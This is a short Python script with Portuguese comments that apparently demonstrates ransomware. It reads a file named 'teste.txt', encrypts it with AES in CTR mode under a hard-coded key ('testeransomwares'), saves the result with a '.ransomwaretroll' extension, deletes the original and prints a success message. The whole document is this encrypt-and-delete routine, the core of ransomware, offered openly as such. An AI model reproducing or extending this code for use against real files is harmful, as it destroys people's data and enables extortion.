import os
import pyaes

# Abrir o arquivo que será criptografado
file_name = "teste.txt"
with open(file_name, "rb") as file:
    file_data = file.read()

# Chave para criptografia (precisa ter 16, 24 ou 32 bytes)
key = b"testeransomwares"[:16]  # Pegando os primeiros 16 bytes

# Criptografar os dados
aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data)

# Criar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
with open(new_file, "wb") as file:
    file.write(crypto_data)

# Remover o arquivo original
os.remove(file_name)

print(f"Arquivo '{file_name}' criptografado com sucesso para '{new_file}'!")
